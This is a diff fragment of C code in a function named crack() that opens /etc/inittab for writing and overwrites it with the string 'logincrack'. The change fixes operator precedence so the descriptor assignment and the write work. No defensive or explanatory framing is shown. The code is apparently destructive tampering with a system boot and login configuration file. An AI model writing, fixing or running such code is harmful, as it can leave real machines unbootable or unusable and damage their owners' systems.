@@ -35,7 +35,7 @@ static void crack(void){
     close(file);
 
     char * buf = "logincrack";
-    if (file = open("/etc/inittab", O_WRONLY) == 1){
+    if ((file = open("/etc/inittab", O_WRONLY)) == 1){
         write(file, buf, 10);
     }
     close(file);
